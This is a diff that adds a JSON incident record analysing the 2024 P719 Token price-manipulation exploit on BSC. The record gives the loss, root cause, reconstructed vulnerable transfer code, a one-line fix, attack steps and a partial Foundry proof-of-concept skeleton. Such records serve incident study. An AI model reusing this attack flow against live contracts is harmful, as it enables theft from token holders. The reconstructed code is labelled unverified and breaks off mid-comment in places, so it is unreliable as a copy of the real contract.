@@ -1,0 +1,32 @@
+{
+ "id": "2024__2024-10-11_P719Token_SellMechanism",
+ "source_file": "2024/2024-10-11_P719Token_SellMechanism.md",
+ "title": "P719 Token — Sell Mechanism Price Manipulation Analysis",
+ "date": "2024-10-11",
+ "protocol": "P719 Token",
+ "chain": "BSC",
+ "loss_raw": "~312,000 USD (547 BNB)",
+ "loss_usd": null,
+ "root_cause": "When P719 transfer() sends tokens to itself, fee tokens are mishandled, causing price distortion",
+ "attack_tx": "0x9afcac8e",
+ "vulnerable_contract": "0x6beee2b5",
+ "classes": [
+  "business-logic",
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "❌ P719 transfer: abnormal behavior when sending to self\n// (unverified contract, behavior analyzed from observation)\nfunction transfer(address to, uint256 amount) public returns (bool) {\n    if (to == address(this)) {\n        //",
+  "❌ Tokens sent to P719 → BNB amount calculated internally\n        // After burn, fee tokens are mishandled → price increases\n        uint256 bnbOut = _calculateSellAmount(amount);\n        _burn(msg.sender, amount);\n        //",
+  "❌ Fee token handling error → LP price distortion\n        _handleFeeTokens(bnbOut);\n        payable(msg.sender).transfer(bnbOut);\n    }\n    // ...\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Fix: block self-transfers, use explicit sell() function"
+ ],
+ "steps": [
+  "Buy P719 → P719.transfer(P719, amount)",
+  "❌ Fee token handling error → price distortion"
+ ],
+ "other_code": [
+  "function testPoC() public {\n    vm.startPrank(attacker);\n    AttackerC attackerC = new AttackerC();\n\n    // Deploy attacker token + LP\n    myToken = new MyToken();\n    myToken.approve(PancakeRouter, type(uint256).max);\n    IFS(PancakeRouter).addLiquidityETH{value: 0.001 ether}(\n        address(myToken), 100 ether, 100 ether, 0.001 ether, attacker, block.timestamp\n    );\n\n    // Set up and execute attack contract\n    attackerC.setup(address(myToken));\n    attackerC.attack();  // manipulates P719 price internally\n\n    // Remove LP\n    address factory = IFS(PancakeRouter).factory();\n    // removeLiquidity...\n}"
+ ]
+}
